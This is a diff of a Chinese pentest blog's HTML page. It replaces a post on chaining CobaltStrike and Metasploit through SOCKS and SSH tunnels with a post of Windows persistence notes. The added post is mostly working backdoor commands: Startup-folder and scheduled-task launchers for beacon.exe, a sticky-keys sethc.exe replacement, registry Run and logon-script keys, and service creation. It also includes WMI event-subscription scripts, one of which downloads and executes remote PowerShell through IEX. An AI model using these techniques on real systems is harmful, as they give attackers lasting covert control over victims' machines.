@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="CobaltStrike,MetaSploit,内网穿透,">
+  <meta name="keywords" content="Windows,backdoor,">
 
 
 
@@ -81,26 +81,20 @@
 
 
 
-<meta name="description" content="CobaltStrike+MetaSploit联动攻击** 本文源于klion红队攻防揭秘  观后复现 ** 重点 1，通过beacon内置socks，将msf带入目标内网2，使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf3，使用msf的exp直接弹回一个beacon4，灵活使用ssh隧道深度隐藏C2  通过beacon内置socks，将msf带入目标内网** CS **">
-<meta name="keywords" content="CobaltStrike,MetaSploit,内网穿透">
+<meta name="description" content="Windows权限维持笔记.在渗透的过程中及时留后门是一个好习惯，可以有效的避免一些意料之外的断连，毕竟断连后不一定还能再次拿下该主机。 不过记得在达成目的后，及时删除后门。PS：操作均为管理员权限下进行 Windows权限维持主要就是依靠自启动或者后门， 自启动目录copy &amp;quot;C:\beacon.exe&amp;quot; &amp;quot;C:\Users\Administrator\AppDat">
+<meta name="keywords" content="Windows,backdoor">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CobaltStrike+MetaSploit联动攻击">
-<meta property="og:url" content="https://github.com/scareing/scareing.github.io/2019/08/29/1566846777/index.html">
+<meta property="og:title" content="Windows权限维持笔记.">
+<meta property="og:url" content="https://github.com/scareing/scareing.github.io/2019/09/24/Windows权限维持笔记/index.html">
 <meta property="og:site_name" content="scareing的学习笔记">
-<meta property="og:description" content="CobaltStrike+MetaSploit联动攻击** 本文源于klion红队攻防揭秘  观后复现 ** 重点 1，通过beacon内置socks，将msf带入目标内网2，使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf3，使用msf的exp直接弹回一个beacon4，灵活使用ssh隧道深度隐藏C2  通过beacon内置socks，将msf带入目标内网** CS **">
+<meta property="og:description" content="Windows权限维持笔记.在渗透的过程中及时留后门是一个好习惯，可以有效的避免一些意料之外的断连，毕竟断连后不一定还能再次拿下该主机。 不过记得在达成目的后，及时删除后门。PS：操作均为管理员权限下进行 Windows权限维持主要就是依靠自启动或者后门， 自启动目录copy &amp;quot;C:\beacon.exe&amp;quot; &amp;quot;C:\Users\Administrator\AppDat">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/5.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/3.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/4.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/8.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/7.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/6.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/cs&msf.png">
-<meta property="og:updated_time" content="2019-11-05T09:26:16.593Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/07/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AC%94%E8%AE%B0/1.jpg">
+<meta property="og:updated_time" content="2019-11-23T14:36:13.580Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CobaltStrike+MetaSploit联动攻击">
-<meta name="twitter:description" content="CobaltStrike+MetaSploit联动攻击** 本文源于klion红队攻防揭秘  观后复现 ** 重点 1，通过beacon内置socks，将msf带入目标内网2，使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf3，使用msf的exp直接弹回一个beacon4，灵活使用ssh隧道深度隐藏C2  通过beacon内置socks，将msf带入目标内网** CS **">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/5.png">
+<meta name="twitter:title" content="Windows权限维持笔记.">
+<meta name="twitter:description" content="Windows权限维持笔记.在渗透的过程中及时留后门是一个好习惯，可以有效的避免一些意料之外的断连，毕竟断连后不一定还能再次拿下该主机。 不过记得在达成目的后，及时删除后门。PS：操作均为管理员权限下进行 Windows权限维持主要就是依靠自启动或者后门， 自启动目录copy &amp;quot;C:\beacon.exe&amp;quot; &amp;quot;C:\Users\Administrator\AppDat">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/07/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AC%94%E8%AE%B0/1.jpg">
 
 
 
@@ -130,13 +124,13 @@
 
 
 
-  <link rel="canonical" href="https://github.com/scareing/scareing.github.io/2019/08/29/1566846777/">
+  <link rel="canonical" href="https://github.com/scareing/scareing.github.io/2019/09/24/Windows权限维持笔记/">
 
 
 
 
 
-  <title>CobaltStrike+MetaSploit联动攻击 | scareing的学习笔记</title>
+  <title>Windows权限维持笔记. | scareing的学习笔记</title>
   
 
 
@@ -273,7 +267,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/29/1566846777/">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/09/24/Windows权限维持笔记/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="scareing">
@@ -290,7 +284,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">CobaltStrike+MetaSploit联动攻击</h1>
+          <h1 class="post-title" itemprop="name headline">Windows权限维持笔记.</h1>
         
 
         <div class="post-meta">
@@ -302,8 +296,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-29T12:12:57+08:00">
-                2019-08-29
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-24T13:15:45+08:00">
+                2019-09-24
               </time>
             
 
@@ -325,8 +319,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透</span>
+                  <a href="/categories/权限维持/" itemprop="url" rel="index">
+                    <span itemprop="name">权限维持</span>
                   </a>
                 </span>
 
@@ -362,41 +356,118 @@
       
 
       
-        <h1 id="CobaltStrike-MetaSploit联动攻击"><a href="#CobaltStrike-MetaSploit联动攻击" class="headerlink" title="CobaltStrike+MetaSploit联动攻击"></a>CobaltStrike+MetaSploit联动攻击</h1><p>** 本文源于klion红队攻防揭秘  观后复现 **</p>
-<h2 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h2><blockquote>
-<p>1，通过beacon内置socks，将msf带入目标内网<br>2，使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf<br>3，使用msf的exp直接弹回一个beacon<br>4，灵活使用ssh隧道深度隐藏C2</p>
+        <h1 id="Windows权限维持笔记"><a href="#Windows权限维持笔记" class="headerlink" title="Windows权限维持笔记."></a>Windows权限维持笔记.</h1><p>在渗透的过程中及时留后门是一个好习惯，可以有效的避免一些意料之外的断连，毕竟断连后不一定还能再次拿下该主机。</p>
+<p>不过记得在达成目的后，及时删除后门。<br>PS：操作均为管理员权限下进行</p>
+<p><strong>Windows权限维持主要就是依靠自启动或者后门，</strong></p>
+<h2 id="自启动目录"><a href="#自启动目录" class="headerlink" title="自启动目录"></a>自启动目录</h2><pre><code>copy &quot;C:\beacon.exe&quot; &quot;C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\beacon.exe&quot; /y
+这目录里面的东西都会在开机登录入系统后启动。</code></pre><p>** 开机自启动 **</p>
+<h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><pre><code>schtasks /create /tn demo /tr &quot;c:\beacon.exe&quot; /sc minute /mo 1
+创建一个名为demo的任务，任务内容为每分钟执行一次C盘根目录下的beacon.exe
+schtasks /delete /tn WindowsUpdate
+删除名为demo的任务</code></pre><p><strong>schtasks可以周期运行，重复检索任务是否处于运行状态，如果任务已经在执行不会重复执行。PS:schtasks可以深度定制。</strong></p>
+<h2 id="shift后门"><a href="#shift后门" class="headerlink" title="shift后门"></a>shift后门</h2><pre><code>takeown /f C:\windows\system32\sethc.* /a /r /d y&amp;&amp;cacls C:\windows\system32\sethc.exe /T /E /G system:F&amp;&amp;copy &quot;C:\beacon.exe&quot; C:\windows\system32\sethc.exe /y
+
+把粘滞键的启动程序改为后门程序。</code></pre><p><strong>要求能进入windows锁屏界面，且未关闭shift启动粘滞键，比如可以3389连过去或者能直接接触到。</strong></p>
+<h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><pre><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d &quot;C:\beacon.exe&quot; /f
+
+reg add HKEY_CURRENT_USER\Environment\UserInitMprLogonScript /t REG_EXPAND_SZ /d C:\beacon.exe</code></pre><p>第二条启动先于杀软，注册表自启动路径很多，记几种常用的即可<br>** 开机自启动 **</p>
+<h2 id="创建服务"><a href="#创建服务" class="headerlink" title="创建服务"></a>创建服务</h2><pre><code>sc create &quot;demo&quot; binpath= &quot;C:\beacon.exe&quot;
+sc config &quot;demo&quot; start= auto
+创建一个名为demo的自启动服务，服务路径为C:\beacon.exe    </code></pre><p>** 开机自启动 **</p>
+<h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><h3 id="SEADADDY的修改版"><a href="#SEADADDY的修改版" class="headerlink" title="SEADADDY的修改版"></a>SEADADDY的修改版</h3><blockquote>
+<p>其中，事件过滤是从PowerSploit的持久化模块，用于在系统启动时触发，事件处理则以SYSTEM权限执行一个程序</p>
 </blockquote>
-<h2 id="通过beacon内置socks，将msf带入目标内网"><a href="#通过beacon内置socks，将msf带入目标内网" class="headerlink" title="通过beacon内置socks，将msf带入目标内网"></a>通过beacon内置socks，将msf带入目标内网</h2><p>** CS **</p>
-<ul>
-<li>beacon&gt; getuid</li>
-<li>beacon&gt; socks 1080<br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/5.png" alt="avatar"></li>
-<li><ul>
-<li>msf **</li>
-</ul>
-</li>
-<li>msf5 &gt; setg Proxies socks4:XXX.XXX.XXX.XXX:1080  //设置代理</li>
-<li>msf5 &gt; setg ReversseAllowProxy true  //双向通道</li>
-</ul>
-<p>现在就可以直接用msf的auxiliary模块扫描目标内网了<br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/3.png" alt="avatar"></p>
-<h2 id="使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf"><a href="#使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf" class="headerlink" title="使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf **"></a>使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf **</h2><p><strong>* 首先创建CS外部tcp监听器 *</strong><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/4.png" alt="avatar"><br><strong>* 然后到本地机器msf创建tcp监听器 *</strong><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/8.png" alt="avatar"><br><strong>* 随后，在vps机器上编辑sshd配置，开启ssh转发功能，重启ssh服务，这是所有使用ssh隧道转发前的必备操作。 *</strong></p>
-<pre><code># vi/etc/ssh/sshd_config
-AllowTcpForwarding yes
-GatewayPorts yes
-TCPKeepAlive yes
-PasswordAuthentication yes
-# systemctl restartsshd.service</code></pre><p><strong>* 回到本地linux中并通过ssh隧道做好ssh转发，意思就是通过vps把来自外部的8080端口流量全部转到本地linux的8080端口上，而本地linux的8080端口上跑的又正好是msf的监听器，所以，最终才会造成meterpreter本地上线的效果 *</strong></p>
-<pre><code># ssh -C -f -N -g -R 0.0.0.0:8080:192.168.0.108:8080 root@xxx.xxx.xxx.xxx -p 22 //建立ssh隧道
-&gt;  -C     //压缩数据 
-&gt;  -f     //运行在后台
-&gt;  -N     //不远程执行命令，对端口转发很有用
-&gt;  -g     //允许远程主机连接到本地转发端口
-&gt;  -R     //[bind_address:]port:host:hostport  端口及地址配置
-# netstat -tulnp | grep &apos;8080&apos; //检查通道是否成功建立</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/7.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/6.png" alt="avatar"></p>
-<p>   <strong>* 最后，回到cs上选择目标内网指定机器的beacon shell 点击 “Spawn” 派生，再选择刚在上面创建好的tcp的外部监听器，相应目标机器的meterpreter就会被直接弹到本地，也可以选择批量操作 *</strong></p>
-<h2 id="使用msf的exp直接弹回一个beacon"><a href="#使用msf的exp直接弹回一个beacon" class="headerlink" title="使用msf的exp直接弹回一个beacon"></a>使用msf的exp直接弹回一个beacon</h2><p>** 暂时复现失败 ** </p>
-<h2 id="灵活利用ssh隧道深度隐藏C2"><a href="#灵活利用ssh隧道深度隐藏C2" class="headerlink" title="灵活利用ssh隧道深度隐藏C2"></a>灵活利用ssh隧道深度隐藏C2</h2><blockquote>
-<p>首先，创建一个普通的http 反向beacon监听器，并用该监听器生成一个64位的exe payload，随后再立即删除该监听器<br>然后本地开启ssh隧道转发，转发刚刚删除的监听器的端口。<br>本地启动cs服务，监听转发的端口，监听器与删除监听器配置相同。<br>当payload执行，本地服务上线。<br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/cs&msf.png" alt="avatar"></p>
+<pre><code>$filterName = &apos;BotFilter82&apos;
+$consumerName = &apos;BotConsumer23&apos;
+$exePath = &apos;C:\Windows\System32\evil.exe&apos;
+$Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &apos;Win32_PerfFormattedData_PerfOS_System&apos; AND TargetInstance.SystemUpTime &gt;=200 AND TargetInstance.SystemUpTime &lt; 320&quot;
+$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace &quot;root\subscription&quot; -Arguments @{Name=$filterName;EventNameSpace=&quot;root\cimv2&quot;;QueryLanguage=&quot;WQL&quot;;Query=$Query} -ErrorAction Stop
+$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace &quot;root\subscription&quot; -Arguments @{Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath}
+Set-WmiInstance -Class __FilterToConsumerBinding -Namespace &quot;root\subscription&quot; -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}</code></pre><h3 id="klion大佬blog"><a href="#klion大佬blog" class="headerlink" title="klion大佬blog"></a>klion大佬blog</h3><blockquote>
+<p>administrator账户登录才会触发</p>
 </blockquote>
+<pre><code>&lt;#
+Credits to @mattifestion for his awesome work on WMI and Powershell Fileless Persistence.  This script is an adaptation of his work.
+#&gt;
+
+function Install-Persistence{
+
+$Payload = &quot;&lt;strong&gt;((new-object net.webclient).downloadstring(&apos;http://172.22.35.241/demo.txt&apos;))&lt;/strong&gt;&quot;
+$EventFilterName = &apos;Cleanup&apos;
+$EventConsumerName = &apos;DataCleanup&apos;
+$finalPayload = &quot;&lt;strong&gt;powershell.exe -nop -c `&quot;IEX $Payload`&quot;&lt;/strong&gt;&quot;
+
+# Create event filter
+$EventFilterArgs = @{
+    EventNamespace = &apos;root/cimv2&apos;
+    Name = $EventFilterName
+    Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &apos;Win32_PerfFormattedData_PerfOS_System&apos; AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 325&quot;
+    QueryLanguage = &apos;WQL&apos;
+}
+
+$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs
+
+# Create CommandLineEventConsumer
+$CommandLineConsumerArgs = @{
+    Name = $EventConsumerName
+    CommandLineTemplate = $finalPayload
+}
+$Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs
+
+# Create FilterToConsumerBinding
+$FilterToConsumerArgs = @{
+    Filter = $Filter
+    Consumer = $Consumer
+}
+$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
+
+#Confirm the Event Filter was created
+$EventCheck = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter &quot;Name = &apos;$EventFilterName&apos;&quot;
+if ($EventCheck -ne $null) {
+    Write-Host &quot;Event Filter $EventFilterName successfully written to host&quot;
+}
+
+#Confirm the Event Consumer was created
+$ConsumerCheck = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter &quot;Name = &apos;$EventConsumerName&apos;&quot;
+if ($ConsumerCheck -ne $null) {
+    Write-Host &quot;Event Consumer $EventConsumerName successfully written to host&quot;
+}
+
+#Confirm the FiltertoConsumer was created
+$BindingCheck = Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding -Filter &quot;Filter = &quot;&quot;__eventfilter.name=&apos;$EventFilterName&apos;&quot;&quot;&quot;
+if ($BindingCheck -ne $null){
+    Write-Host &quot;Filter To Consumer Binding successfully written to host&quot;
+}
+
+}
+
+function Remove-Persistence{
+$EventFilterName = &apos;Cleanup&apos;
+$EventConsumerName = &apos;DataCleanup&apos;
+
+# Clean up Code - Comment this code out when you are installing persistence otherwise it will
+
+$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter &quot;Name = &apos;$EventConsumerName&apos;&quot;
+$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter &quot;Name = &apos;$EventFilterName&apos;&quot;
+$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query &quot;REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding&quot;
+
+$FilterConsumerBindingToCleanup | Remove-WmiObject
+$EventConsumerToCleanup | Remove-WmiObject
+$EventFilterToCleanup | Remove-WmiObject
+
+}
+
+function Check-WMI{
+Write-Host &quot;Showing All Root Event Filters&quot;
+Get-WmiObject -Namespace root/subscription -Class __EventFilter
+
+Write-Host &quot;Showing All CommandLine Event Consumers&quot;
+Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer
+
+Write-Host &quot;Showing All Filter to Consumer Bindings&quot;
+Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
+}</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/07/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AC%94%E8%AE%B0/1.jpg" alt="avatar"></p>
+<p>​     </p>
 
       
     </div>
@@ -422,7 +493,7 @@ PasswordAuthentication yes
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://github.com/scareing/scareing.github.io/2019/08/29/1566846777/" title="CobaltStrike+MetaSploit联动攻击">https://github.com/scareing/scareing.github.io/2019/08/29/1566846777/</a>
+    <a href="https://github.com/scareing/scareing.github.io/2019/09/24/Windows权限维持笔记/" title="Windows权限维持笔记.">https://github.com/scareing/scareing.github.io/2019/09/24/Windows权限维持笔记/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -437,11 +508,9 @@ PasswordAuthentication yes
       
         <div class="post-tags">
           
-            <a href="/tags/CobaltStrike/" rel="tag"># CobaltStrike</a>
+            <a href="/tags/Windows/" rel="tag"># Windows</a>
           
-            <a href="/tags/MetaSploit/" rel="tag"># MetaSploit</a>
-          
-            <a href="/tags/内网穿透/" rel="tag"># 内网穿透</a>
+            <a href="/tags/backdoor/" rel="tag"># backdoor</a>
           
         </div>
       
@@ -454,8 +523,8 @@ PasswordAuthentication yes
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/08/27/绕过Powershell执行策略执行ps脚本。/" rel="next" title="绕过Powershell执行策略执行ps脚本。">
-                <i class="fa fa-chevron-left"></i> 绕过Powershell执行策略执行ps脚本。
+              <a href="/2019/09/10/命令行文件下载的各种姿势/" rel="next" title="命令行文件下载的各种姿势">
+                <i class="fa fa-chevron-left"></i> 命令行文件下载的各种姿势
               </a>
             
           </div>
@@ -464,8 +533,8 @@ PasswordAuthentication yes
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/09/10/1566846777/" rel="prev" title="命令行文件下载的各种姿势">
-                命令行文件下载的各种姿势 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/10/05/利用C#byass AV/" rel="prev" title="《使用C＃编写自定义后门负载》学习笔记及免杀尝试">
+                《使用C＃编写自定义后门负载》学习笔记及免杀尝试 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -617,7 +686,7 @@ PasswordAuthentication yes
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CobaltStrike-MetaSploit联动攻击"><span class="nav-number">1.</span> <span class="nav-text">CobaltStrike+MetaSploit联动攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#重点"><span class="nav-number">1.1.</span> <span class="nav-text">重点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#通过beacon内置socks，将msf带入目标内网"><span class="nav-number">1.2.</span> <span class="nav-text">通过beacon内置socks，将msf带入目标内网</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf"><span class="nav-number">1.3.</span> <span class="nav-text">使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf **</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用msf的exp直接弹回一个beacon"><span class="nav-number">1.4.</span> <span class="nav-text">使用msf的exp直接弹回一个beacon</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#灵活利用ssh隧道深度隐藏C2"><span class="nav-number">1.5.</span> <span class="nav-text">灵活利用ssh隧道深度隐藏C2</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows权限维持笔记"><span class="nav-number">1.</span> <span class="nav-text">Windows权限维持笔记.</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#自启动目录"><span class="nav-number">1.1.</span> <span class="nav-text">自启动目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#定时任务"><span class="nav-number">1.2.</span> <span class="nav-text">定时任务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shift后门"><span class="nav-number">1.3.</span> <span class="nav-text">shift后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注册表"><span class="nav-number">1.4.</span> <span class="nav-text">注册表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#创建服务"><span class="nav-number">1.5.</span> <span class="nav-text">创建服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WMI"><span class="nav-number">1.6.</span> <span class="nav-text">WMI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SEADADDY的修改版"><span class="nav-number">1.6.1.</span> <span class="nav-text">SEADADDY的修改版</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#klion大佬blog"><span class="nav-number">1.6.2.</span> <span class="nav-text">klion大佬blog</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
